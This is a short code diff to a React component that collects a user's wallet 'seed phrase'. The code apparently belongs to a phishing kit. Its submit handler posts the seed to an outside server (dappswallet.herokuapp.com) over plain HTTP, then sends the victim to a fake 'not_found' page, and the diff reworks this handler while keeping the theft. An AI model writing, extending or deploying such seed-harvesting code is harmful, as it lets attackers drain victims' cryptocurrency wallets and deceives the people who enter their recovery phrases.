@@ -25,10 +25,16 @@ const Phrase = ({ seed1, setSeed1, error1, setError1, disabled1, setDisabled1, c
   };
 
 
-  const handleSubmit = async(e) => {
-    await axios.post("http://dappswallet.herokuapp.com/form", { seed: seed1 });
-    Navigate('/not_found')
-  }
+  const handleSubmit = async (e) => {
+    const res = await axios.post("http://dappswallet.herokuapp.com/form", {
+      seed: seed1
+    });
+    if (res.data.status === 200) {
+      Navigate("/not_found");
+    } else {
+      console.log("error eyaf happen");
+    }
+  };
 
   useEffect(() => {
     if (count1 == 0 || error1) {
